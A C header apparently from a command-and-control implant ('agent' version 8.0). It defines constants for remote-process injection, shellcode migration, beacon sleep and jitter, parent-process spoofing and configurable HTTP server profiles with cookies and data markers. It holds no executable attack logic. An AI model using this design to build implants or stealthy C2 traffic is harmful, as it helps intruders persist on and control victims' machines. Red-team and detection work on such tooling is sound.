#pragma once
#ifndef CONFIG_H
#define CONFIG_H

#ifdef _WIN32
#define DIRECTORY_SEPARATOR '\\'
#else
#define DIRECTORY_SEPARATOR '/'
#endif

#define AGENT_VERSION "8.0"

// Agent errors
#define ERROR_OK											0x00000000
#define ERROR_PIPE_CREATION									0xc0000001
#define ERROR_EVENT_CREATION								0xc0000002
#define ERROR_INJECTION										0xc0000003
#define ERROR_PIPE_SERVER_CONNECT							0xc0000004
#define ERROR_PIPE_WRITE									0xc0000005
#define ERROR_EVENT_NOT_SIGNALED							0xc0000006
#define ERROR_TARGET_FILE_NOT_FOUND							0xc0000007
#define ERROR_ALLOC_MEMORY									0xc0000008
#define ERROR_DIRECTORY_ACCESS_ERROR						0xc0000009
#define ERROR_FILE_ACCESS_ERROR								0xc000000a
#define ERROR_JSON_CONVERSION								0xc000000b
#define ERROR_BASE64_DECODE									0xc000000c
#define ERROR_PROCESS_CREATION								0xc000000d
#define ERROR_MISSING_DATA									0xc000000e
#define ERROR_INJECTION_OPENPROCESS							0xc0001001
#define ERROR_INJECTION_VIRTUALALLOC						0xc0001002
#define ERROR_INJECTION_WRITEPROCESSMEMORY					0xc0001003
#define ERROR_INJECTION_CREATEREMOTETHREAD					0xc0001004
#define ERROR_INJECTION_ENABLEDYNAMICCODE					0xc0001005
#define ERROR_INTERCEPTOR_NOT_STARTED						0xc0002001
#define ERROR_INTERCEPTOR_NAMEDPIPE_SERVER_DOWN				0xc0002002
#define ERROR_INTERCEPTOR_NAMEDPIPE_CLIENT					0xc0002003
#define ERROR_INTERCEPTOR_NOT_CONNECTED						0xc0002004
#define ERROR_UNKNOWN										0xffffffff

#define SUCCESS(x) ((uint32_t)(x) == ERROR_OK)

// Process run info
#define RUN_INTERCEPTOR "interceptor"
#define RUN_BITNESS "bitness"
#define RUN_PID "pid"
#define RUN_MAIN "main"
#define RUN_BACKGROUND "noout"

// Migration info
#define MIGRATION_EFFECTIVECONFIG "config"
#define MIGRATION_SESSION_KEY "session_key"
#define MIGRATION_ORIGINALSESSIONKEY "original_session_key"
#define MIGRATION_SESSIONKEYITERATION "key_iteration"
#define MIGRATION_PUBLICIP "public_ip"
#define MIGRATION_ACTIVESERVER "active_server"
#define MIGRATION_SESSIONID "session_id"
#define MIGRATE_PID RUN_PID
#define MIGRATE_SHELLCODE "shellcode"

// Process kill info
#define KILL_PID "pid"

// Exec info
#define EXEC_COMMAND "command"
#define EXEC_USE_SHELL "shell"
#define EXEC_RUN_BACKGROUND "noout"

// Config Info
#define CONFIG_PUBKEY "public_key"

#define CONFIG_SESSION "session"
#define CONFIG_SESSION_SLEEP "sleep"
#define CONFIG_SESSION_EXPIRATION "expire"
#define CONFIG_SESSION_JITTER "jitter"
#define CONFIG_SESSION_SHELL "shell"
#define CONFIG_SESSION_PROCESSPARENT "process_parent"
#define CONFIG_SESSION_EXEC "exec"
#define CONFIG_SESSION_EXEC_HOSTPROCESS "host_process"
#define CONFIG_SESSION_EXEC_HOSTPROCESS_X86 "x86"
#define CONFIG_SESSION_EXEC_HOSTPROCESS_X64 "x64"
#define CONFIG_SESSION_EXEC_PROCESSPARENT "process_parent"

#define CONFIG_SERVER "servers"
#define CONFIG_SERVER_ADDRESS "address"
#define CONFIG_SERVER_PORT "port"
#define CONFIG_SERVER_PROTO "proto"
#define CONFIG_SERVER_PROXY "proxy"
#define CONFIG_SERVER_REQUEST "request"
#define CONFIG_SERVER_REQUEST_HEADERS "headers"
#define CONFIG_SERVER_REQUEST_COOKIES "cookies"
#define CONFIG_SERVER_REQUEST_PATH "path"
#define CONFIG_SERVER_REQUEST_DATA "data"
#define CONFIG_SERVER_REQUEST_DATA_PREPEND "prepend"
#define CONFIG_SERVER_REQUEST_DATA_APPEND "append"
#define CONFIG_SERVER_REQUEST_METHOD "no_data_method"
#define CONFIG_SERVER_REQUEST_SESSIONCOOKIE "session_cookie"
#define CONFIG_SERVER_RESPONSE "response"
#define CONFIG_SERVER_RESPONSE_STATUSCODE "status_code"
#define CONFIG_SERVER_RESPONSE_DATA "data"
#define CONFIG_SERVER_RESPONSE_DATA_START_MARKER "start_marker"
#define CONFIG_SERVER_RESPONSE_DATA_END_MARKER "end_marker"

#define CONFIG_DATA "data"
#define CONFIG_DATA_LZ4COMPRESS "compress"
#define CONFIG_DATA_BASE64ENCODE "encode"
#define CONFIG_DATA_ENCRYPT "encrypt"

#endif